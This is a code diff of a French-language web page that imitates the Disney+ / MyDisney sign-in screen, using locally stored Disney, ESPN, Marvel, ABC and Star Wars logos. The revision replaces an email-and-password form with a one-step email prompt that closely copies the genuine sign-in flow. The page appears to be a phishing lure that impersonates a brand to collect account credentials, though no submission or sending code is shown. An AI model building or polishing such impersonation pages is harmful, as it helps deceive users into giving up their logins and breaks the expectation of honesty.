@@ -9,119 +9,146 @@
     body {
       margin: 0;
       font-family: 'Helvetica Neue', Arial, sans-serif;
-      background-image: url('Images/compose.png');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      color: white;
+      background: url('Images/compose.png') no-repeat center center/cover;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-    }
-
-    header {
-      padding: 30px 40px;
+      align-items: center;
+      justify-content: flex-start;
     }
 
     .logo {
-      width: 100px;
+      margin-top: 40px;
+      width: 140px;
       height: auto;
     }
 
-    .form-container {
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 40px 20px;
-    }
-
-    .form-box {
-      background-color: rgba(0, 0, 0, 0.75);
-      backdrop-filter: blur(8px);
-      border-radius: 12px;
-      padding: 40px;
-      max-width: 400px;
+    .form-wrapper {
+      background-color: #fff;
+      color: #000;
+      max-width: 420px;
       width: 100%;
-      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .form-box h1 {
-      margin-bottom: 30px;
-      font-size: 28px;
+      margin-top: 30px;
+      border-radius: 18px;
+      padding: 40px 30px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
       text-align: center;
+    }
+
+    .form-wrapper img.my-disney {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+
+    .form-wrapper h1 {
+      font-size: 1.5rem;
       font-weight: bold;
-      text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+      margin-bottom: 12px;
     }
 
-    form {
-      display: flex;
-      flex-direction: column;
+    .form-wrapper p {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 25px;
+      line-height: 1.4;
     }
 
-    input {
+    input[type="email"] {
+      width: 100%;
       padding: 14px;
-      margin-bottom: 20px;
-      border: none;
+      font-size: 1rem;
       border-radius: 6px;
-      font-size: 16px;
-      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      margin-bottom: 25px;
+      background-color: #f0f0f0;
     }
 
-    input::placeholder {
+    input[type="email"]::placeholder {
       color: #888;
     }
 
     button {
+      width: 100%;
       padding: 14px;
-      background-color: #0063e5;
+      background-color: #000;
       color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
       font-weight: bold;
+      font-size: 1rem;
+      border: none;
+      border-radius: 50px;
       cursor: pointer;
-      transition: background-color 0.3s, transform 0.2s ease;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
 
     button:hover {
-      background-color: #0483ee;
+      background-color: #333;
       transform: scale(1.02);
     }
 
+    .footer-note {
+      font-size: 0.75rem;
+      color: #444;
+      margin-top: 30px;
+      line-height: 1.4;
+    }
+
+    .logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .logos img {
+      height: 22px;
+      opacity: 0.8;
+    }
+
     @media (max-width: 480px) {
-      .form-box {
+      .form-wrapper {
+        margin: 20px;
         padding: 30px 20px;
       }
 
-      .form-box h1 {
-        font-size: 22px;
+      .form-wrapper h1 {
+        font-size: 1.3rem;
       }
 
       .logo {
-        width: 80px;
+        width: 110px;
       }
 
-      header {
-        padding: 20px;
+      .form-wrapper img.my-disney {
+        width: 80px;
       }
     }
   </style>
 </head>
 <body>
-  <header>
-    <img src="Images/compose2.png" alt="Disney+" class="logo" />
-  </header>
+  <img src="Images/compose2.png" alt="Disney+" class="logo" />
 
-  <main class="form-container">
-    <div class="form-box">
-      <h1>Connexion à Disney+</h1>
-      <form id="loginForm">
-        <input type="email" placeholder="Adresse e-mail" required />
-        <input type="password" placeholder="Mot de passe" required />
-        <button type="submit">Continuer</button>
-      </form>
+  <main class="form-wrapper">
+    <img src="Images/mydisney.png" alt="MyDisney" class="my-disney" />
+    <h1>Entrez votre adresse e-mail pour continuer</h1>
+    <p>
+      Identifiez-vous sur Disney+ avec votre compte MyDisney. Si vous n'en avez pas, vous serez invité(e) à en créer un.
+    </p>
+    <form id="loginForm">
+      <input type="email" placeholder="Adresse e-mail" required />
+      <button type="submit">Continuer</button>
+    </form>
+
+    <div class="footer-note">
+      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
+      MyDisney vous permet d'accéder facilement aux différents services du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#" style="color: #0063e5;">et bien +</a>.
+      <div class="logos-container">
+    <img src="Images/My-Disney-Experience-Logo.png" alt="MyDisney" class="logo-marque" />
+    <img src="Images/abc-logo-image-4413.png" alt="ABC" class="logo-marque" />
+    <img src="Images/espn-png-logo-4149.png" alt="ESPN" class="logo-marque" />
+    <img src="Images/marvel-logo-34291.png" alt="Marvel" class="logo-marque" />
+    <img src="Images/star-wars-logo-1002.png" alt="Star Wars" class="logo-marque" />
+  </div>
     </div>
   </main>
 
